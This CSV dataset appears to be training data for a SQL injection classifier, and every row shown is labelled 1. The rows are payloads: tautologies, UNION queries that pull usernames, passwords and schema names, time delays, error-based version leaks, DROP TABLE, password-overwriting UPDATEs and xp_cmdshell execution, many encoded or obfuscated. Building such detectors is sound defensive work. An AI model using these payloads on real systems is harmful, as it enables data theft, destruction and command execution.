Sentence,Label
"test"" UNION SELECT 1,2,3-- AND 1=1512 AND 1=1#793 AND 1=1",1
1'---- OR 1=1,1
"admin"" OR 1=1-- OR 1=1433",1
"1"" UNION SELECT NULL----395/* AND 1=1228931162",1
"admin' UNION SELECT username,password FROM users-- AND 1=1 OR 1=1--#",1
"admin"" OR 1=1-- OR 1=1 AND 1=1 AND 1=1330",1
'/**/OR/**/1=1-- OR 1=1/* AND 1=1,1
useradmin' OR 1=1----976,1
"'/**/AND/**/extractvalue(1,concat(0x7e,version()))---- AND 1=1302909148",1
""" OR 1=1/*--#211",1
' or 2=2/*36752 OR 1=1,1
"adminadmin"" OR ""1""=""1/*--/*217 OR 1=1 OR 1=1576",1
user') OR 1=1-- AND 1=1325 AND 1=167#460 AND 1=1,1
"""%20or%201=1# AND 1=1 OR 1=1447907",1
test' OR 1=1----825,1
"admin"" UNION SELECT NULL,NULL,NULL--/*517432",1
10x27; WAITFOR DELAY 0x2700:00:050x27---- OR 1=1 AND 1=1,1
' UNION ALL SELECT NULL--##,1
"""%20or%201=1/*835 OR 1=1 OR 1=1344572",1
admin1' OR '1' = '1--/*603#937172,1
"' AND 1=CONVERT(int,(SELECT @@version))-- AND 1=1953--#423199",1
"99'; INSERT INTO users VALUES('hacked','pass')-- OR 1=1210958236--217816",1
""" AND extractvalue(1,concat(0x7e,version()))-- OR 1=1278583236681",1
"user"" OR 1=1--/* OR 1=178599 OR 1=1",1
"""%20UNION%20ALL%20SELECT%20NULL--108574",1
"1""%20AND%20pg_sleep(5)--533872287 OR 1=1#",1
1' And sLeep(5)--398 OR 1=1,1
' OR '2'='2 AND 1=1 AND 1=1--173--113,1
admin') OR 1=1-- OR 1=1,1
admin0x27/*58 OR 1=1,1
"1'; INSERT INTO users VALUES('hacked','pass')--739/*",1
test1' OR '1' = '1/*#63257751374,1
"1"" OR ""1""=""1 OR 1=1257--57050791",1
"1' UNION SELECT username,password FROM users--32",1
'/**/or/**/1=1--,1
' OR '2'='213 AND 1=1/*668644,1
"useradmin"" OR ""1""=""1-- OR 1=1125464",1
admin' OR '1'='1--812,1
"' UNION SELECT 1,2,3--/*#882",1
test' OR 1=1## AND 1=1--,1
' or 2=2--/*404,1
"99'; INSERT INTO users VALUES('hacked','pass')--372816#--731",1
"""%20UNION%20ALL%20SELECT%20NULL--108427",1
"' UNION SELECT NULL,NULL,NULL--/* OR 1=1",1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns--/*/*554#",1
'+OR+1=1--156/*437902724,1
%27%29%20OR%20%28%271%27%3D%271 AND 1=1956 OR 1=1/*,1
"test1"" UNION SELECT NULL,table_name FROM information_schema.tables----418 OR 1=1915 OR 1=1",1
"2"" OR ""2"" = ""2163254#/*97#133 AND 1=1976",1
"1""%20UNION%20SELECT%20NULL,table_name%20FROM%20information_schema.tables-- OR 1=1--/*720",1
1' OR '1' = '1 AND 1=1566 OR 1=1 OR 1=1/*,1
';%20EXEC%20xp_cmdshell('dir')--591 AND 1=1108/*##48--690,1
admin%2527--215650,1
""";+EXEC+xp_cmdshell(""dir"")-- AND 1=1--247810561426",1
"test' UNION SELECT NULL,NULL--/* AND 1=1--265",1
1' OR 1=1/*# OR 1=1/* AND 1=1#,1
""" OR 1=1#----# AND 1=1--722",1
"1"" UNION SELECT NULL----159334593107 AND 1=1/*55",1
"user' UNION SELECT NULL,NULL--# OR 1=1/*655428109",1
admin1' OR '1' = '1--/*/*814-- OR 1=1145,1
testadmin' OR '1'='1 AND 1=1 OR 1=1 OR 1=1632,1
"test' UNION SELECT NULL,NULL--/* AND 1=1--#",1
'; UPDATE USERS SET PASSWORD='HACKED'--69164 AND 1=1355,1
"""+OR+""1""=""1--77985",1
1' OR '1' = '1 AND 1=1566 OR 1=1 OR 1=133#463,1
"admin"" UNION SELECT NULL,NULL,NULL--/*517 AND 1=1594--913#",1
""" union select null,null,null--# AND 1=1--682546",1
"' AND extractvalue(99,concat(0x7e,version()))-- OR 1=1212",1
"test1"" OR ""1"" = ""1/*# AND 1=1--503#",1
' UNION SELECT NULL--/*622/*427/*256 OR 1=1 AND 1=1 OR 1=1,1
"1"" UNION SELECT NULL,NULL------611--306/*",1
"1"";+INSERT+INTO+users+VALUES(""hacked"",""pass"")--517457849",1
admin' UNION SELECT NULL-- AND 1=1#645/*735 AND 1=1 OR 1=1,1
"""%20UNION%20SELECT%20NULL,NULL,NULL--511138729 OR 1=1",1
user' OR '1'='1#315-- AND 1=1/*684/*,1
1'%09AND%09pg_sleep(5)--860 OR 1=1258190421#,1
' UNION SELECT NULL--/*622/*42723926340,1
%27%20OR%20%27a%27%3D%27a/*--#273,1
"1'%09UNION%09SELECT%09NULL,column_name%09FROM%09information_schema.columns--# AND 1=1 AND 1=1379",1
"99'; INSERT INTO users VALUES('hacked','pass')--372816#--252696747",1
user' OR 1=1--/* OR 1=178/*117,1
"1"" OR ""a""=""a AND 1=1--376--546407",1
admin%27%20OR%20%271%27%3D%27120 AND 1=1#87117359,1
admin' OR 1=1-- AND 1=1173820,1
"test"" OR 1=1##933102#/*986 OR 1=1570490",1
"test1"" UNION SELECT NULL,table_name FROM information_schema.tables---- AND 1=1 AND 1=1",1
' AND 1=CAST((SELECT @@version) AS int)-- OR 1=1,1
admin' UNION SELECT NULL-- AND 1=1#645/* OR 1=1387,1
'/**/OR/**/'1'='1'/**/-- OR 1=1575 OR 1=1,1
"""%09UNION%09SELECT%09NULL,NULL-- OR 1=1511 AND 1=1",1
"""%09or%091=1# AND 1=1 OR 1=1691449626985677",1
'%09OR%09'1'='1/*/*433,1
%2527%2520OR%25201%253D1/%252A53842,1
"test' UNION SELECT NULL,NULL,NULL--# OR 1=1",1
"admin"" UNION SELECT 1,2,3---- OR 1=155",1
'%20or%201=1# OR 1=1835,1
"0x27 UNION SELECT NULL,NULL,NULL-- AND 1=1--",1
1' OR '1'='1/* AND 1=1 OR 1=1/* AND 1=1,1
testadmin' OR '1'='1 AND 1=1613993,1
""" OR ""1""=""1 AND 1=1/*",1
0x27) OR 1=1--# AND 1=1191,1
"'%20UNION%20SELECT%20NULL,NULL,NULL----#71217",1
"""%20or%201=1#428/*363",1
admin' OR 1=1/*## OR 1=1349628,1
"1"" UNION SELECT NULL,NULL----469--",1
'%20or%201=1--969 OR 1=1122540,1
useradmin' OR 1=1----#,1
"admin"" UNION SELECT NULL-- AND 1=194",1
"admin"" OR 1=1/*--#691 OR 1=1",1
%2527%2520UNION%2520SELECT%25201%252C2%252C3--614832,1
"""%09or%091=1# AND 1=1 OR 1=1691449626985#",1
admin' UNION ALL SELECT NULL----# AND 1=1691943,1
'+UNION+SELECT+NULL--680,1
"1""+UNION+SELECT+NULL,table_name+FROM+information_schema.tables-- AND 1=1964 AND 1=1/*",1
"test1' UNION SELECT NULL,table_name FROM information_schema.tables-- AND 1=157/*543",1
"admin' UNION SELECT NULL,NULL,NULL--",1
"testadmin"" OR ""1""=""1 AND 1=1613186499 AND 1=1237",1
"user"" OR 1=1/*--968",1
1'%09OR%09'1'%09=%09'1998/*107,1
"user"" OR 1=1--/* OR 1=178",1
' UNION SELECT NULL--/*622/*427/*256588,1
"admin' UNION SELECT 1,2,3--#343841 OR 1=1",1
"admin"" UNION SELECT NULL,NULL--897514154 OR 1=1 OR 1=1/*74",1
1' OR '1'='1' --#57 OR 1=1901 OR 1=1845,1
admin'%20OR%20'1'='1 AND 1=1 OR 1=1732 OR 1=1,1
"admin1"" OR ""1"" = ""1--/*603#937149995915408",1
%2527%2520OR%25201%253D1/%252A--4 OR 1=1993,1
%2527%2520or%25201%253D1/%252A523 AND 1=1123,1
' UNION SELECT NULL--/*622/*427/*/*,1
"1'%09UNION%09SELECT%09NULL,column_name%09FROM%09information_schema.columns--600/* OR 1=1",1
"1"" OR ""1"" = ""1--81796314451",1
'+OR+1=1#/*/*130,1
"1' UNION SELECT NULL,NULL,NULL--149203",1
"""%20or%201=1-- OR 1=1--318",1
"1"" UNION SELECT NULL,NULL------611--306493--",1
' UNION SELECT NULL--/*622/*427/*515 OR 1=1510,1
"test' UNION SELECT username,password FROM users--/*836#49",1
"'/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))--138/*--514",1
0x27) OR 1=1--# AND 1=1--/*--,1
"test' UNION SELECT username,password FROM users--/*836#902",1
1'%20AND%20SLEEP(5)--,1
admin0x27/*46746835 AND 1=1,1
' OR '1'='1' --/* AND 1=1963988,1
""" or 1=1-- OR 1=1",1
ADMIN'/*--672134,1
1'%09AND%09pg_sleep(5)--860 OR 1=1258656,1
"admin' UNION SELECT username,password FROM users--294",1
"1""/**/AND/**/SLEEP(5)--560",1
' AND 1=CAST((SELECT @@version) AS int)--/*/*,1
"0x27 UNION SELECT 1,2,3--",1
admin'%20OR%20'1'='1 AND 1=1987656414589#790169,1
admin'%20OR%20'1'='1 AND 1=1987656 OR 1=1,1
"1"" UNION SELECT NULL,NULL,NULL--149 OR 1=1 OR 1=1--",1
1%27%3B%20DROP%20TABLE%20users--/*861,1
99'--,1
';%20EXEC%20xp_cmdshell('dir')--591 AND 1=1108/*##48699,1
admin%27%20OR%20%271%27%3D%27120 AND 1=1#87117475,1
admin1' OR '1' = '1--/*60386608378,1
0x27 UNION ALL SELECT NULL--415 OR 1=1,1
' OR '1'='1--322613,1
'/**/OR/**/1=1-- OR 1=1876--/*--266716,1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns-- OR 1=1838--",1
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1189 OR 1=1 AND 1=1/*969",1
11' OR 1 = 1/*--# OR 1=1 AND 1=1,1
admin' OR 1=1#/*471287,1
'%20or%201=1# AND 1=1/*7 OR 1=1,1
"2"" OR 2 = 2--#/*",1
' AND 1=CAST((SELECT @@version) AS int)--/*570/*13,1
1'; WAITFOR DELAY '00:00:010'--866-- AND 1=1429394,1
"""%09UNION%09ALL%09SELECT%09NULL--477/*-- AND 1=1#892-- OR 1=1923 OR 1=1#",1
' OR '2'='2/*699,1
"' union select null,null,null--# AND 1=1--491 OR 1=1911",1
admin' UNION ALL SELECT NULL--24127# AND 1=1631,1
"""+OR+1=1#/*-- AND 1=1460",1
10x27 AND pg_sleep(5)--796,1
user1' OR '1' = '1659700,1
"'%09UNION%09SELECT%09NULL,NULL-- OR 1=1 OR 1=1",1
"""+UNION+SELECT+NULL--608967",1
"1' UNION SELECT 1,2,3-- AND 1=1------",1
"""/**/OR/**/1=1-- OR 1=1#",1
""" OR 1=1#-- OR 1=1# AND 1=1812 AND 1=1 OR 1=1",1
1' UNION SELECT NULL----395628330 OR 1=1,1
""" OR 1=1#----##--",1
1' OR '1' = '1 AND 1=1566 OR 1=1 OR 1=1 OR 1=1,1
"""/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))--138344--",1
%2527%2520OR%25201%253D1/%252A53623,1
""" OR ""2""=""2 AND 1=1 AND 1=1--173143",1
1admin' OR '1'='1/*/*965,1
' AND 2=CAST((SELECT @@version) AS int)--# AND 1=1393 OR 1=1,1
"admin"" OR 1=1#177464",1
'/**/OR/**/1=1-- OR 1=1 AND 1=1636/*,1
"1"" OR ""1""=""1/* AND 1=1 OR 1=1/* OR 1=1659--282827",1
""" OR 1=1#--813",1
1' UNION SELECT NULL----395628330262,1
1' OR 'a'='a AND 1=1334220,1
') OR ('1'='1/* OR 1=1/* OR 1=1 OR 1=1 AND 1=1572167,1
"' AND extractvalue(1,concat(0x7e,version()))-- AND 1=1",1
"ADMIN""/*172871--",1
' UNION ALL SELECT NULL--#164,1
"ADMIN""/*172247 AND 1=1645287#",1
';+EXEC+xp_cmdshell('dir')-- AND 1=1--372/*,1
1' OR '1'='1' --/*612 AND 1=1700,1
"'%20UNION%20SELECT%20NULL,NULL,NULL--511138/* OR 1=1",1
'+OR+1=1--156/*437902508,1
1%27%3B%20DROP%20TABLE%20users--/*586 AND 1=1 OR 1=1348 OR 1=1,1
"' UNION SELECT username,password FROM users--879",1
"ADMIN""/*172620",1
admin' OR 1=1#36,1
"user"") OR (""1""=""1 OR 1=1 AND 1=1/*715",1
') OR ('1'='1/* OR 1=1--/*248 OR 1=1,1
"""%09UNION%09ALL%09SELECT%09NULL--477/*-- AND 1=1812 AND 1=185365759",1
user' OR 1=1/*/* AND 1=1--118 AND 1=1,1
test' OR 1=1#/*# AND 1=1 AND 1=1,1
"testadmin"" OR ""1""=""1 AND 1=1613186#/*",1
"'/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))--138/*-- AND 1=1767",1
"admin"" UNION SELECT NULL,NULL,NULL--/*975",1
"1"" AND pg_sleep(10)--",1
""" UNION ALL SELECT NULL--/* AND 1=1--99144",1
"admin' UNION SELECT NULL,NULL--#492",1
"test' UNION SELECT username,password FROM users--/*-- AND 1=1 OR 1=1",1
admin' OR '1'='1946#540981,1
1' OR 1=1# AND 1=1,1
"test' UNION SELECT 1,2,3--/*10 AND 1=1# AND 1=1109",1
'%09or%091=1# AND 1=1 OR 1=1 AND 1=1697,1
10x27; WAITFOR DELAY 0x2700:00:050x27----928 AND 1=1/* OR 1=1,1
0x27; WAITFOR DELAY 0x270:0:50x27--,1
'%09OR%09'1'='1/*911,1
test' OR '1'='1-- OR 1=1733922173,1
'/**/OR/**/'a'='a922980/*,1
""")+OR+(""1""=""1-- AND 1=1729612",1
admin'%20OR%20'1'='1 AND 1=1987656414 AND 1=1,1
"user"" UNION SELECT NULL--/*583--74832",1
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1311# OR 1=1#927# OR 1=1",1
2' OR 2 = 2--#/*951 AND 1=1,1
1' OR 'a'='a544/*606850,1
1' OR 1=1##--,1
"11"" UNION SELECT NULL,table_name FROM information_schema.tables--/*--/*",1
"1""; INSERT INTO users VALUES(""hacked"",""pass"")--739-- OR 1=1--343234923",1
"0x27 UNION SELECT username,password FROM users--593#",1
"""/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))--138/*-- AND 1=1 OR 1=1",1
0x27 OR 0x2710x27=0x2710x27 --676,1
"1'; INSERT INTO users VALUES('hacked','pass')--739##375 AND 1=1#",1
"""/**/OR/**/1=1-- OR 1=1/*857470924837",1
test' OR 1=1#/*#889602,1
%27%20OR%20%27a%27%3D%27a/*-- AND 1=1,1
""";+EXEC+xp_cmdshell(""dir"")--## AND 1=1--84912",1
"1'%09UNION%09SELECT%09NULL,column_name%09FROM%09information_schema.columns--# AND 1=1 AND 1=1# OR 1=1",1
1' OR 'a'='a544#80 AND 1=1758,1
"user"" OR 1=1--/* OR 1=1#",1
"""/**/OR/**/""1""=""1""/**/-- OR 1=1----",1
1%2527%2520AND%2520BENCHMARK%25285000000%252CMD5%2528%2527A%2527%2529%2529--309236,1
"0x27 UNION SELECT username,password FROM users--593237",1
1'%20OR%20'1'%20=%20'1--,1
"test1"" UNION SELECT NULL,table_name FROM information_schema.tables----418 OR 1=1915#",1
"""/**/OR/**/1=1-- OR 1=1373 AND 1=1809",1
"admin' UNION SELECT NULL,NULL,NULL--/*",1
"user' UNION SELECT NULL,NULL--#530",1
admin' OR 1=1#/*120637 AND 1=1,1
"1"" UNION SELECT NULL,NULL------611-- OR 1=1--377569",1
"1"" OR ""1"" = ""1-- OR 1=1233",1
admin0x27/* OR 1=1877399,1
""" OR ""1""=""1"" /*###205",1
' UNION SELECT NULL--/*622 OR 1=1,1
user') OR ('1'='1--#--167,1
';%09EXEC%09xp_cmdshell('dir')---- AND 1=1887461--,1
"user"" UNION SELECT NULL--/*583--928",1
2'--106,1
%27%3B%20SELECT%20SLEEP%285%29--272,1
'%20or%201=1#/*119--,1
admin' UNION ALL SELECT NULL--24127# AND 1=1/*,1
"' union select null,null,null--# AND 1=1433",1
'%20or%201=1# AND 1=1 AND 1=1 OR 1=1429845332/*,1
"""%09UNION%09ALL%09SELECT%09NULL--477/*-- AND 1=1227",1
""" OR 1=1/*--929888175#626",1
test1' OR 1 = 1/*835,1
"test"" OR 1=1##933152",1
"user"" UNION SELECT NULL--/*58370 AND 1=1 OR 1=1",1
"test1"" OR ""1"" = ""1/*# AND 1=1--631274343",1
ADMIN'/* AND 1=1----770,1
"'%20UNION%20SELECT%20NULL,NULL,NULL--511138# AND 1=1842",1
""" OR ""a""=""a83989127808",1
"testadmin"" OR ""1""=""1 AND 1=1613----#58",1
"admin"") OR (""1""=""1# OR 1=1171",1
0x27) OR 1=1--#550,1
admin' UNION ALL SELECT NULL-- AND 1=111/*583,1
'; UPDATE USERS SET PASSWORD='HACKED'--69164 OR 1=1 AND 1=1,1
"1"" UNION SELECT NULL,NULL--# OR 1=1483",1
admin' OR '1'='1 AND 1=1998126,1
2' AND SLEEP(5)--76181683,1
test' UNION SELECT NULL----/*--19564,1
"""/**/OR/**/1=1-- OR 1=1876--/*--266",1
2' OR '2' = '2163254#784245,1
1'; WAITFOR DELAY '00:00:010'--866/*597,1
"1""%20AND%20pg_sleep(5)--533872287498",1
'%20or%201=1--969 OR 1=1/*215 OR 1=1786610,1
admin' OR 1=1#/*471153 OR 1=1,1
"' union select null,null,null--#--",1
user') OR 1=1--#,1
1' OR '1'='1' --#57 OR 1=1901 OR 1=1850,1
"test"" OR ""1""=""1"" ----",1
1' OR '1' = '1-- AND 1=1 AND 1=1,1
'%20or%201=1--969 OR 1=1430,1
"test"" UNION SELECT 1,2,3-- AND 1=1512#",1
"user1' UNION SELECT NULL,table_name FROM information_schema.tables----701",1
1' OR '1' = '1 AND 1=1566 OR 1=1 OR 1=1#987,1
test' UNION ALL SELECT NULL--378,1
1%27%20AND%20BENCHMARK%285000000%2CMD5%28%27A%27%29%29----520 AND 1=1,1
'%20or%201=1#/* OR 1=1 OR 1=1622,1
1' OR '1'='1 OR 1=1257#167,1
') OR ('1'='1/* OR 1=1293952,1
""" OR ""1""=""1"" /*##256/*",1
')+OR+('1'='1 AND 1=1 OR 1=1--171#,1
admin' OR 2=2--925348#,1
ADMIN'/* AND 1=1585,1
""";+EXEC+xp_cmdshell(""dir"")-- AND 1=1 AND 1=1/*705",1
"1';+INSERT+INTO+users+VALUES('hacked','pass')-- AND 1=1 OR 1=1174 OR 1=1/*",1
') OR ('1'='1/* OR 1=1--/* AND 1=1848,1
'%20or%201=1# OR 1=1743,1
admin1' OR '1' = '1--/*603#937149 AND 1=1,1
1' UNION SELECT NULL----395 OR 1=1#,1
'+OR+1=1#/*# AND 1=1/*#/*/* OR 1=1 OR 1=1264,1
' OR '2'='213/*997,1
'+OR+1=1----966515,1
"admin"" UNION SELECT username,password FROM users--#",1
"admin"") OR (""1""=""1# OR 1=1/*358",1
' OR '2'='213973 AND 1=1--53 AND 1=1635305,1
"""/**/OR/**/1=1-- OR 1=1373 AND 1=1415",1
"1"" UNION SELECT NULL,NULL,NULL--149 OR 1=1 OR 1=1494819270",1
' OR 1=1#-- OR 1=1# OR 1=1,1
"test"") OR 1=1--/*--/*",1
"1"" OR ""1""=""1/* AND 1=1 OR 1=1/* OR 1=1497352 AND 1=1",1
"ADMIN""/*172247 AND 1=1256",1
1'%20AND%20pg_sleep(5)--533553833,1
"2""--",1
' OR 1=1#----#184137/*,1
1%2527%2520AND%2520BENCHMARK%25285000000%252CMD5%2528%2527A%2527%2529%2529--309462#,1
'%20or%201=1# AND 1=136894,1
'%09OR%09'1'='1/*243,1
1' OR '1' = '1 AND 1=1 AND 1=1/*702239,1
1'%09OR%09'1'%09=%09'131,1
user') OR 1=1-- AND 1=1325 AND 1=167187,1
"""/**/UNION/**/SELECT/**/NULL,NULL,NULL--306889339",1
"1'; INSERT INTO users VALUES('hacked','pass')--739--353# OR 1=1 AND 1=1",1
"99'; INSERT INTO users VALUES('hacked','pass')-- OR 1=1210958236----",1
test' OR 1=1##933#,1
"""%20UNION%20SELECT%20NULL,NULL,NULL--511138##401",1
"1'; INSERT INTO users VALUES('hacked','pass')--739--353#253#",1
' OR 'a'='a839826953,1
0x27) OR 1=1--# AND 1=1457,1
"user"" UNION SELECT NULL,NULL--/* OR 1=1 OR 1=1756",1
"11' UNION SELECT NULL,table_name FROM information_schema.tables--/*--/*481240",1
"admin' UNION SELECT NULL,NULL--#122619423#",1
1' OR 'a'='a544#80 AND 1=1 AND 1=1,1
"1"" UNION SELECT NULL,NULL------611-- OR 1=1 OR 1=13",1
2' AND SLEEP(5)----232 OR 1=1,1
""" OR 1=1#---- OR 1=1130#",1
"1"";+INSERT+INTO+users+VALUES(""hacked"",""pass"")--517457#35983",1
admin'/**/OR/**/1=1-- OR 1=1402562/*,1
"1"" OR ""1""=""1"" --#412640681",1
"1'%20UNION%20SELECT%20NULL,table_name%20FROM%20information_schema.tables--408108",1
"1'/**/UNION/**/SELECT/**/NULL,table_name/**/FROM/**/information_schema.tables--140",1
')+OR+('1'='1 AND 1=1 OR 1=1934,1
'; DROP TABLE users--801403,1
admin0x27/* OR 1=1 AND 1=1955#,1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns-- OR 1=1 OR 1=1 OR 1=1370 OR 1=1195",1
"'/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))--138/*--121",1
"useradmin"" OR ""1""=""1-- OR 1=1125737 AND 1=1",1
user') OR 1=1-- AND 1=1882350307# OR 1=1 AND 1=1,1
"useradmin"" OR ""1""=""1-- OR 1=1125737251",1
"user"") OR (""1""=""1 OR 1=1 AND 1=1/* AND 1=1",1
"'/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))--# AND 1=168/*963",1
"test' UNION SELECT 1,2,3--/*#974 OR 1=1#75 AND 1=173",1
"test"" OR ""1""=""1"" /*#/*654 OR 1=1",1
admin' OR 2=2--925348/*#,1
"useradmin"" OR 1=1--#572/*-- OR 1=1--693",1
admin'/**/OR/**/1=1--/*78839,1
admin'%20OR%20'1'='1 AND 1=1987656414 OR 1=1,1
' OR '1'='1/*,1
"1"" OR ""1""=""1/* AND 1=1 OR 1=1/* OR 1=1659--282 AND 1=1843",1
' OR '1'='1 AND 1=1 OR 1=1179,1
1' OR 1=1/*/*--,1
'+OR+1=1#/*--454,1
"99'; INSERT INTO users VALUES('hacked','pass')--372816#392 AND 1=1",1
"""+OR+""1""=""1--77--",1
"test' UNION SELECT 1,2,3----209",1
test' OR '1'='1' --714132412,1
user') OR ('1'='1--167387351,1
' OR '99'='99,1
"test"" OR ""1""=""1/* OR 1=1530",1
""" UNION SELECT NULL,NULL,NULL--241",1
"test' UNION SELECT username,password FROM users--/*836#--",1
ADMIN'/* AND 1=1911 AND 1=110515875558,1
'/**/OR/**/'1'='1'/**/--/*75#632,1
"' AND 1=CONVERT(int,(SELECT @@version))-- AND 1=1953--# OR 1=184#",1
1'%20OR%201%20=%201753--,1
"1""%09OR%09""1""%09=%09""199884",1
1%27%3B%20INSERT%20INTO%20users%20VALUES%28%27hacked%27%2C%27pass%27%29--#804192102,1
1'; WAITFOR DELAY '00:00:010'--866/*304,1
%2527%2520UNION%2520ALL%2520SELECT%2520NULL--,1
"""%20or%201=1/*835 OR 1=1620901",1
' or 2=2----973766,1
admin' OR 1=1-- OR 1=1#781549,1
useradmin' OR '1'='1--977,1
"admin' UNION SELECT NULL,NULL--#122619151",1
ADMIN'/*172620/*#,1
""" OR ""2""=""213/*10375",1
"11' UNION SELECT NULL,table_name FROM information_schema.tables--/*--/*481477915",1
%2527%2520OR%25201%253D1/%252A--4 OR 1=1177,1
'%20or%201=1/*835257383135304,1
%27%20AND%201%3DCONVERT%28int%2C%28SELECT%20%40%40version%29%29--184#,1
"1""+OR+1+=+171",1
"testadmin"" OR 1=1-- AND 1=1126 OR 1=1 OR 1=1",1
1%27%3B%20DROP%20TABLE%20users--/*914,1
""" or 2=2/* AND 1=1 OR 1=1##",1
user') OR ('1'='1#,1
"'+UNION+SELECT+NULL,NULL--# OR 1=1",1
user' UNION SELECT NULL-- AND 1=1931,1
"""%20UNION%20SELECT%20NULL,NULL,NULL--511138/*81",1
"1'%09UNION%09SELECT%09NULL,column_name%09FROM%09information_schema.columns--600--35",1
admin' OR 1=1#/*120637/*/*,1
"""/**/UNION/**/SELECT/**/NULL,NULL,NULL--306587--",1
' OR '1'='1 AND 1=1 OR 1=1895,1
"admin"" OR 1=1#/*32775687171 OR 1=1 AND 1=1",1
1'%09OR%09'1'%09=%09'199884#,1
""" AND extractvalue(1,concat(0x7e,version()))-- OR 1=1278583118",1
"""%09UNION%09ALL%09SELECT%09NULL--477/*-- AND 1=1812#--",1
"'/**/AND/**/extractvalue(1,concat(0x7e,version()))--761--/*316/*",1
10x27; WAITFOR DELAY 0x2700:00:050x27----928 AND 1=1 OR 1=1406404 OR 1=1 AND 1=1,1
"admin"") OR (""1""=""1# OR 1=1601 AND 1=1815540 OR 1=1",1
"admin"" UNION SELECT NULL,NULL--181 OR 1=1",1
1%27%20OR%20%271%27%20%3D%20%271/*191#,1
"test1' UNION SELECT NULL,table_name FROM information_schema.tables-- AND 1=157437501",1
"user"" UNION SELECT NULL,NULL--/* OR 1=1428683",1
admin' UNION SELECT NULL----607#653434,1
"""/**/OR/**/""1""=""1""/**//*",1
"testadmin"" OR 1=1-- AND 1=1#",1
'+OR+1=1#/*/*978,1
"admin"" OR 1=1/*--# OR 1=1",1
1' OR '1'='1 OR 1=1257-- OR 1=1,1
"test' UNION SELECT NULL,NULL----",1
"1"" OR 1=1/*#/*",1
test1' OR '1' = '1/*#11,1
admin0x27 OR 1=1--,1
"admin1"" OR ""1"" = ""1# OR 1=1/*67721470786",1
"admin"") OR (""1""=""1# OR 1=1601 AND 1=1815 OR 1=1 OR 1=1/* AND 1=1",1
'%20UNION%20ALL%20SELECT%20NULL--908 OR 1=1,1
"admin"" OR ""1""=""1"" /*",1
ADMIN'/*172620 OR 1=1805 AND 1=1,1
' OR 99=99#162,1
"1"" AND pg_sleep(5)-- AND 1=1",1
')+OR+('1'='1 AND 1=1 OR 1=1#763,1
"test' UNION SELECT 1,2,3--/*#974 OR 1=1 OR 1=1920",1
"admin' UNION SELECT NULL,NULL--#57",1
"1' UNION SELECT NULL,table_name FROM information_schema.tables-- AND 1=1 OR 1=1#731105/*",1
admin' UNION ALL SELECT NULL----569539,1
%2527%2520UNION%2520SELECT%2520username%252Cpassword%2520FROM%2520users--,1
%2527%253B%2520UPDATE%2520users%2520SET%2520password%253D%2527hacked%2527--,1
' OR 99=99##686,1
""" OR ""1""=""1"" /*##256176762",1
ADMIN'/* AND 1=1911 AND 1=1281,1
"admin"" UNION ALL SELECT NULL-- AND 1=1-- OR 1=1",1
""" OR ""2""=""2 OR 1=1702",1
"user"" UNION SELECT NULL--/*58370 OR 1=1",1
' AND 2=CAST((SELECT @@version) AS int)--# AND 1=1/*581288,1
"1'; INSERT INTO users VALUES('hacked','pass')--739-- OR 1=1518231601",1
"admin' UNION SELECT NULL,NULL,NULL--/*# AND 1=1708840",1
'%09UNION%09ALL%09SELECT%09NULL--/*/*31,1
' OR '2'='213/*#/*,1
"test' UNION SELECT 1,2,3-- AND 1=1512/*",1
"1""; INSERT INTO users VALUES(""hacked"",""pass"")--739####160",1
1' UNION SELECT NULL----395628#,1
'/**/or/**/1=1/* AND 1=1779,1
admin'%20OR%20'1'='1 AND 1=1987656414589#--,1
' UNION ALL SELECT NULL--#--,1
"1"" UNION SELECT NULL,NULL------611--306493405",1
"admin1"" OR ""1"" = ""1# AND 1=1#785489383#950",1
10x27; WAITFOR DELAY 0x2700:00:050x27----928 AND 1=1 OR 1=1406404 OR 1=1--,1
'/**/or/**/1=1/*135 OR 1=1165,1
' or 2=2/* AND 1=1/*910,1
"99""; INSERT INTO users VALUES(""hacked"",""pass"")--372816#--413",1
admin' OR '1'='1' /* AND 1=1--,1
"admin"" UNION SELECT NULL,NULL--181--360",1
useradmin' OR 1=1------230,1
